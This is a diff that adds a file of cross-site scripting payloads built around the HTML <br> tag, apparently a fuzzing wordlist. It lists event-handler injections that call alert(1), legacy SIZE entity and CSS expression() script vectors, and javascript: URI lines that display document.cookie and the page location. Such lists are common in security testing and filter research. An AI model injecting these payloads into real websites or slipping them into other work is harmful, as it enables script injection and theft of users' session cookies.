@@ -1,0 +1,55 @@
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><x id=x>#x
+<br draggable="true" ondrag="alert(1)">test</br>
+<br draggable="true" ondragend="alert(1)">test</br>
+<br draggable="true" ondragenter="alert(1)">test</br>
+<br draggable="true" ondragleave="alert(1)">test</br>
+<br draggable="true" ondragstart="alert(1)">test</br>
+Break Up JavaScript Directive with Null
+Break Up XSS Attack with Embedded Carriage Return
+<br/><hr/>feed:feed:javAscript:javAscript:feed:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>
+<br/><hr/>jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>
+<br id=x tabindex=1 onactivate=alert(1)></br>
+<br id=x tabindex=1 onbeforeactivate=alert(1)></br>
+<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>
+<br id=x tabindex=1 ondeactivate=alert(1)></br><input id=y autofocus>
+<br id=x tabindex=1 onfocus=alert(1)></br>
+<br id=x tabindex=1 onfocusin=alert(1)></br>
+<br onbeforecopy="alert(1)" contenteditable>test</br>
+<br onbeforecut="alert(1)" contenteditable>test</br>
+<br onbeforepaste="alert(1)" contenteditable>test</br>
+<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>
+<br onclick="alert(1)">test</br>
+<br oncontextmenu="alert(1)">test</br>
+<br oncopy="alert(1)" contenteditable>test</br>
+<br oncut="alert(1)" contenteditable>test</br>
+<br ondblclick="alert(1)">test</br>
+<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>
+<br onkeydown="alert(1)" contenteditable>test</br>
+<br onkeypress="alert(1)" contenteditable>test</br>
+<br onkeyup="alert(1)" contenteditable>test</br>
+<br onmousedown="alert(1)">test</br>
+<br onmouseenter="alert(1)">test</br>
+<br onmouseleave="alert(1)">test</br>
+<br onmousemove="alert(1)">test</br>
+<br onmouseout="alert(1)">test</br>
+<br onmouseover="alert(1)">test</br>
+<br onmouseup="alert(1)">test</br>
+<br onpaste="alert(1)" contenteditable>test</br>
+<;br size=\";&;{alert(&#039;XSS&#039;)}\";>;
+<BR SIZE="&{alert(1025)}">
+<BR SIZE="&{alert(1658)}">
+<br size=\"&{alert(1756)}\">
+<;BR SIZE=";&;{alert(1907)}";>;
+<;br size=\";&;{alert(1931)}\";>;
+<br size="&{alert(249)}">
+<BR SIZE="&{alert(744)}">
+<br size=\"&{alert('XSS')}\">
+<;BR SIZE=";&;{alert(';XSS';)}";>;
+<BR SIZE="&{alert('XSS')}">
+<br SIZE="&{document.vulnerable=true}">
+<BR SIZE="&{javascript:alert(1)}">
+<BR SIZE="&{javascript:alert(1589)}">
+<BR SIZE="&{javascript:alert(675)}">
+</br style=a:expression(alert())>
+<;/br style=a:expression(alert())>;
